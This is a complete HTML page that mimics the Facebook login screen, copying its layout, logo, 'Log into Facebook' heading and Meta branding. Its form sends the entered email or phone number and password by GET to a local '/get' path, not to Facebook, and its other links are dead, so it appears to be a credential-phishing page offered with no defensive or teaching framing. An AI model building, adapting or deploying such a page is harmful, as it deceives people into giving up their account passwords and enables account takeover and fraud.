<!DOCTYPE html>
<html>
<head>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;600;700&display=swap');
        * { box-sizing: border-box; margin: 0; padding: 0; }
        :root{
            --fb-blue:#1877f2;
            --text:#1c1e21;
            --muted:#606770;
            --border:#d0d7de;
            --bg:#ffffff;
        }
        body{
            font-family: Roboto, Helvetica, Arial, sans-serif;
            background: var(--bg);
            min-height: 100vh;
            color: var(--text);
        }
        .main-container{
            min-height: 100vh;
            display: grid;
            grid-template-columns: 1fr 1px 1fr;
            align-items: center;
        }
        .divider-line{
            height: 100vh;
            background: #e5e7eb;
        }
        .left-panel{
            height: 100%;
            display: flex;
            align-items: center;
            justify-content: flex-start;
            padding: 64px 48px 64px 72px;
        }
        .left-inner{
            max-width: 560px;
            width: 100%;
        }
        .fb-mark{
            width: 48px;
            height: 48px;
            margin-bottom: 48px;
        }
        .headline{
            font-size: 64px;
            line-height: 1.05;
            font-weight: 400;
            letter-spacing: -1.5px;
        }
        .headline .blue{
            color: var(--fb-blue);
        }
        .right-panel{
            height: 100%;
            display: flex;
            align-items: center;
            justify-content: flex-start;
            padding: 64px 72px 64px 48px;
        }
        .form-wrap{
            width: 100%;
            max-width: 560px;
        }
        .login-title{
            font-size: 20px;
            font-weight: 500;
            margin-bottom: 24px;
            color: var(--text);
        }
        .login-form{
            display: flex;
            flex-direction: column;
            gap: 14px;
        }
        .input-field{
            width: 100%;
            height: 54px;
            padding: 0 18px;
            border: 1px solid var(--border);
            border-radius: 8px;
            font-size: 16px;
            color: var(--text);
            background: #fff;
            outline: none;
            transition: border-color .15s, box-shadow .15s;
        }
        .input-field::placeholder{ color: #6b7280; }
        .input-field:focus{
            border-color: rgba(24,119,242,.65);
            box-shadow: 0 0 0 4px rgba(24,119,242,.12);
        }
        .login-btn{
            height: 54px;
            border: none;
            border-radius: 999px;
            background: var(--fb-blue);
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: filter .15s, transform .05s;
        }
        .login-btn:hover{ filter: brightness(0.95); }
        .login-btn:active{ transform: translateY(1px); }
        .forgot-password{
            text-align: center;
            margin-top: 8px;
        }
        .forgot-password a{
            color: var(--text);
            text-decoration: none;
            font-size: 15px;
        }
        .forgot-password a:hover{ text-decoration: underline; }
        .big-divider{
            height: 1px;
            background: #e5e7eb;
            margin: 22px 0;
        }
        .create-account-btn{
            height: 54px;
            border-radius: 999px;
            border: 1px solid var(--fb-blue);
            background: #fff;
            color: var(--fb-blue);
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color .15s, transform .05s;
        }
        .create-account-btn:hover{ background: rgba(24,119,242,.06); }
        .create-account-btn:active{ transform: translateY(1px); }
        .meta-row{
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-top: 24px;
        }
        .meta-row svg{
            height: 18px;
        }
        .meta-row .meta-text{
            font-size: 15px;
            font-weight: 500;
            color: #0180FA;
        }
        .footer{
            border-top: 1px solid #e5e7eb;
            padding: 16px 24px;
            display: flex;
            justify-content: center;
            gap: 22px;
            flex-wrap: wrap;
            color: #6b7280;
            font-size: 13px;
        }
        .footer a{
            color: #6b7280;
            text-decoration: none;
        }
        .footer a:hover{ text-decoration: underline; }
        @media (max-width: 980px){
            .main-container{
                grid-template-columns: 1fr;
            }
            .divider-line{ display: none; }
            .left-panel, .right-panel{
                padding: 36px 20px;
                justify-content: center;
            }
            .headline{
                font-size: 44px;
                text-align: center;
            }
            .left-inner{ text-align: center; }
            .form-wrap{ max-width: 520px; }
        }
    </style>
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
</head>
<body>
<div class="main-container">
    <div class="left-panel">
        <div class="left-inner">
            <svg class="fb-mark" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
                <circle cx="24" cy="24" r="24" fill="#1877f2"/>
                <path d="M32.5 30.5L33.5 24H27V20C27 18.3 27.8 17 30.4 17H34V11.3C34 11.3 31 10.5 28.2 10.5C22.3 10.5 18.5 14 18.5 20.5V24H12.5V30.5H18.5V46.5C19.8 46.8 21.2 47 22.5 47C23.8 47 25.2 46.8 26.5 46.5V30.5H32.5Z" fill="white"/>
            </svg>
            <h1 class="headline">Explore<br>the things<br><span class="blue">you love</span>.</h1>
        </div>
    </div>
    <div class="divider-line"></div>
    <div class="right-panel">
        <div class="form-wrap">
            <h2 class="login-title">Log into Facebook</h2>
            <form action="/get" id="email-form-step" class="login-form">
                <input name="email" type="text" class="input-field" placeholder="Email or mobile number" required>
                <input name="password" type="password" class="input-field" placeholder="Password" required>
                <button class="login-btn" type="submit">Log in</button>
            </form>
            <div class="forgot-password">
                <a href="#">Forgot password?</a>
            </div>
            <div class="big-divider"></div>
            <button type="button" class="create-account-btn" style="width:100%;">Create new account</button>
            <div class="meta-row">
                <svg viewBox="0 0 150 99" xmlns="http://www.w3.org/2000/svg">
                    <path d="M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z" fill="#0180FA"/>
                </svg>
                <span class="meta-text">Meta</span>
            </div>
        </div>
    </div>
</div>
<div class="footer">
    <a href="#">English (US)</a>
    <a href="#">Español</a>
    <a href="#">Français (France)</a>
    <a href="#">中文(简体)</a>
    <a href="#">العربية</a>
    <a href="#">Português (Brasil)</a>
    <a href="#">Italiano</a>
    <a href="#">More languages…</a>
</div>
</body>
</html>
